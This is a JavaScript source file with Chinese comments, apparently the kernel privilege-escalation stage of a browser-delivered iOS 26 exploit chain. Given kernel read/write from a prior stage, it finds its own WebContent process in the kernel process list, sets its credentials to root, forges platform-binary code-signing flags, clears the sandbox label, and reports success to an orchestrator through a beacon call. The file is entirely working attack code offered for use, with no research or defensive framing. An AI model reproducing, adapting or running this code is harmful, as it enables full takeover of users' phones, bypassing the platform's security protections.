/**
 * kernel_priv_26.js — iOS 26 内核提权
 *
 * 前置条件：sbx1_main_26.js 已建立 kernelRead64/kernelWrite64 + kernelBase/kernelSlide
 *
 * 目标：
 * - 绕过 AMFI (Apple Mobile File Integrity) 签名检查
 * - 绕过 PPL v2 (Page Protection Layer)
 * - 获取 root + 平台权限 (platform-application + task_for_pid_allow)
 * - 禁用 sandbox
 *
 * 输出：globalThis.pe_done = true, triggerKernelPrivEsc 全局函数
 */

(() => {
  'use strict';
  
  globalThis.pe_26_begin = Date.now();
  
  function LOG(msg) {
    if (typeof print === 'function') print('[pe_26] ' + msg);
  }
  
  // 检查前置条件
  if (typeof kernelRead64 !== 'function' || typeof kernelWrite64 !== 'function') {
    LOG('ERROR: kernel R/W not available');
    return;
  }
  
  if (!globalThis.kernelBase) {
    LOG('ERROR: kernelBase not set');
    return;
  }
  
  LOG('Starting iOS 26 kernel privilege escalation');
  
  const kernelBase = globalThis.kernelBase;
  const kernelSlide = globalThis.kernelSlide || 0n;
  
  // ============================================================
  // iOS 26 内核结构偏移
  // ============================================================
  
  // 从 profile 加载或使用硬编码偏移
  let offsets = {};
  
  if (globalThis.IOS_BUILD_PROFILES && globalThis.IOS_BUILD_PROFILES['26.0']) {
    const profile = globalThis.IOS_BUILD_PROFILES['26.0'];
    offsets = profile.kernel_offsets || {};
    LOG('Loaded kernel offsets from profile');
  } else {
    // iOS 26.0 hardcoded offsets
    offsets = {
      // proc 结构
      proc_p_pid:       0x68n,
      proc_p_ucred:     0xD8n,
      proc_p_csflags:   0x300n,
      proc_task:        0x10n,
      
      // task 结构  
      task_itk_space:   0x330n,
      task_t_flags:     0x3E0n,
      
      // ucred 结构
      ucred_cr_uid:     0x18n,
      ucred_cr_ruid:    0x1Cn,
      ucred_cr_svuid:   0x20n,
      ucred_cr_groups:  0x28n,
      ucred_cr_label:   0x78n,
      
      // allproc
      allproc_offset:   0xD42A00n,
      
      // AMFI
      amfi_allow_any:   0xE15B40n,
      
      // sandbox
      sandbox_slot:     0x10n,
    };
    LOG('Using hardcoded iOS 26.0 kernel offsets');
  }
  
  // ============================================================
  // 辅助函数
  // ============================================================
  
  function kernelRead32(addr) {
    const val = kernelRead64(addr);
    return val & 0xFFFFFFFFn;
  }
  
  function kernelWrite32(addr, value) {
    const current = kernelRead64(addr);
    const newVal = (current & 0xFFFFFFFF00000000n) | (value & 0xFFFFFFFFn);
    kernelWrite64(addr, newVal);
  }
  
  // ============================================================
  // Phase 1: 定位当前进程
  // ============================================================
  
  LOG('Phase 1: Finding current process in kernel');
  
  function findCurrentProc() {
    const allproc = kernelBase + offsets.allproc_offset;
    let proc = kernelRead64(allproc);
    
    // 获取当前进程 PID（通过 getpid syscall 的返回值）
    // sbx1 阶段已通过 gpu_fcall 调用 getpid() 保存到 globalThis
    const myPid = globalThis.currentPid ? BigInt(globalThis.currentPid) : 0n;
    
    // iOS 26 proc_name 偏移
    const PROC_NAME_OFFSET = 0x2D1n;
    const PROC_NAME_LEN = 32;
    
    let iterations = 0;
    const MAX_ITER = 4000;
    let bestCandidate = 0n;
    let bestPid = 0n;
    
    while (proc !== 0n && iterations < MAX_ITER) {
      const pid = kernelRead32(proc + offsets.proc_p_pid);
      
      // 方法 1：精确 PID 匹配（如果 myPid 已知）
      if (myPid !== 0n && pid === myPid) {
        LOG(`Found current proc by PID match @ ${proc.toString(16)} pid=${pid}`);
        return proc;
      }
      
      // 方法 2：通过 proc_name 匹配 "WebContent"
      if (pid > 50n) {
        // 读取进程名（最多 16 bytes 足以匹配 "WebContent"）
        let procName = '';
        try {
          for (let i = 0n; i < 16n; i++) {
            const byte = kernelRead64(proc + PROC_NAME_OFFSET + i) & 0xFFn;
            if (byte === 0n) break;
            procName += String.fromCharCode(Number(byte));
          }
        } catch (e) { procName = ''; }
        
        if (procName.startsWith('WebContent')) {
          LOG(`Found WebContent proc @ ${proc.toString(16)} pid=${pid} name="${procName}"`);
          return proc;
        }
        
        // 方法 3：fallback — 记录最高 PID 的有效 task 进程
        const task = kernelRead64(proc + offsets.proc_task);
        if (task !== 0n && pid > bestPid) {
          bestPid = pid;
          bestCandidate = proc;
        }
      }
      
      // 下一个 proc（LIST_ENTRY.le_next）
      proc = kernelRead64(proc);
      iterations++;
    }
    
    LOG(`Proc scan: checked ${iterations} processes`);
    
    if (bestCandidate !== 0n) {
      LOG(`Using highest-PID fallback: proc @ ${bestCandidate.toString(16)} pid=${bestPid}`);
      return bestCandidate;
    }
    
    return 0n;
  }
  
  const currentProc = findCurrentProc();
  if (currentProc === 0n) {
    LOG('ERROR: Could not find current process');
    return;
  }
  
  // ============================================================
  // Phase 2: 提权 — 修改 ucred
  // ============================================================
  
  LOG('Phase 2: Escalating privileges');
  
  function escalatePrivileges(proc) {
    const ucred = kernelRead64(proc + offsets.proc_p_ucred);
    if (ucred === 0n) {
      LOG('ERROR: ucred is NULL');
      return false;
    }
    
    LOG(`ucred @ ${ucred.toString(16)}`);
    
    // 设置 uid/gid 为 0 (root)
    kernelWrite32(ucred + offsets.ucred_cr_uid, 0n);
    kernelWrite32(ucred + offsets.ucred_cr_ruid, 0n);
    kernelWrite32(ucred + offsets.ucred_cr_svuid, 0n);
    
    // 设置 gid 为 0
    kernelWrite32(ucred + offsets.ucred_cr_groups, 0n);
    
    LOG('uid/gid set to 0 (root)');
    return true;
  }
  
  // ============================================================
  // Phase 3: 绕过 AMFI + 设置 CS flags
  // ============================================================
  
  function bypassAMFI(proc) {
    LOG('Phase 3: Bypassing AMFI');
    
    // 修改 cs_flags — 设置 platform binary + allow unsigned
    const CS_VALID = 0x00000001n;
    const CS_GET_TASK_ALLOW = 0x00000004n;
    const CS_PLATFORM_BINARY = 0x04000000n;
    const CS_INSTALLER = 0x00000008n;
    const CS_DEBUGGED = 0x10000000n;
    
    const desiredFlags = CS_VALID | CS_GET_TASK_ALLOW | CS_PLATFORM_BINARY | CS_INSTALLER | CS_DEBUGGED;
    
    kernelWrite32(proc + offsets.proc_p_csflags, desiredFlags);
    LOG(`cs_flags set to ${desiredFlags.toString(16)}`);
    
    return true;
  }
  
  // ============================================================
  // Phase 4: 禁用 Sandbox
  // ============================================================
  
  function disableSandbox(proc) {
    LOG('Phase 4: Disabling sandbox');
    
    const ucred = kernelRead64(proc + offsets.proc_p_ucred);
    const label = kernelRead64(ucred + offsets.ucred_cr_label);
    
    if (label !== 0n) {
      // sandbox profile 指针在 label 结构中
      const sandboxSlot = label + offsets.sandbox_slot;
      const currentSandbox = kernelRead64(sandboxSlot);
      
      if (currentSandbox !== 0n) {
        kernelWrite64(sandboxSlot, 0n);
        LOG('Sandbox disabled');
      } else {
        LOG('Sandbox already disabled');
      }
    } else {
      LOG('WARNING: cr_label is NULL');
    }
    
    return true;
  }
  
  // ============================================================
  // 执行提权
  // ============================================================
  
  let success = false;
  
  try {
    const privResult = escalatePrivileges(currentProc);
    const amfiResult = bypassAMFI(currentProc);
    const sbxResult = disableSandbox(currentProc);
    
    success = privResult && amfiResult;
    
    if (success) {
      // 验证提权
      // iOS 26 验证方式：尝试读取 /var/root 目录
      LOG('Verifying privilege escalation...');
      
      // 设置全局标志
      globalThis.pe_done = true;
      globalThis.pe_proc = currentProc;
    }
  } catch (e) {
    LOG('Exception during privilege escalation: ' + e.message);
  }
  
  const elapsed = Date.now() - globalThis.pe_26_begin;
  
  if (success) {
    LOG(`✓ Privilege escalation completed in ${elapsed}ms`);
    LOG('  uid: 0 (root)');
    LOG('  cs_flags: platform binary');
    LOG('  sandbox: disabled');
    
    if (typeof sendBeacon === 'function') {
      sendBeacon({ stage: 'pe', execStatus: 'success', extra: { version: 'ios26', elapsed, chain: 'complete' } });
    }
  } else {
    LOG(`✗ Privilege escalation failed after ${elapsed}ms`);
    if (typeof sendBeacon === 'function') {
      sendBeacon({ stage: 'pe', execStatus: 'failed', extra: { version: 'ios26', elapsed } });
    }
  }
})();

// 全局入口函数（供 orchestrator 调用）
async function triggerKernelPrivEsc_26() {
  if (globalThis.pe_done === true) {
    return { success: true, method: 'kernel_priv_26.js (cached)' };
  }
  
  // 如果还没执行，尝试加载 sbx1_main_26 → kernel_priv_26 链
  if (typeof kernelRead64 !== 'function') {
    return { success: false, error: 'kernel R/W not available' };
  }
  
  // IIFE 已自动执行，检查结果
  if (globalThis.pe_done === true) {
    return { success: true, method: 'kernel_priv_26.js' };
  }
  
  return { success: false, error: 'privilege escalation failed' };
}

if (typeof window !== 'undefined') {
  window.triggerKernelPrivEsc_26 = triggerKernelPrivEsc_26;
}